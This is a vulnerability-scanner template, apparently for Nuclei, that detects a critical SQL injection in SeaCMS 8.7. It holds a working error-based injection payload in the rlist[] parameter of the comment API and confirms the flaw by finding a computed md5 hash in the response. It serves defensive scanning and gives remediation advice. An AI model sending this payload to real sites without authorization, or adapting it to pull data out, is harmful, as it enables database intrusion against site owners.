id: seacms-sqli
info:
  name: SeaCMS 8.7 - SQL Injection
  author: ritikchaddha
  severity: critical
  description: SeaCMS 8.7 is susceptible to a SQL injection exploit, which can enable
    an unauthorized user to access confidential data, manipulate information, and
    execute unauthorized administrative actions on the affected site.
  reference:
  - https://www.uedbox.com/post/54561/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: seacms,sqli
  metadata:
    impact: The SQL injection vulnerability in SeaCMS 8.7 can lead to an attacker
      accessing sensitive information, altering data, and performing unauthorized
      actions on the targeted website.
    recommendation: It is strongly recommended to update SeaCMS to the latest version
      as soon as possible to prevent SQL injection attacks.
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5({{num}})))),@`%27`'
  host-redirects: true
  max-redirects: 2
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '{{md5({{num}})}}'
  - type: status
    status:
    - 200
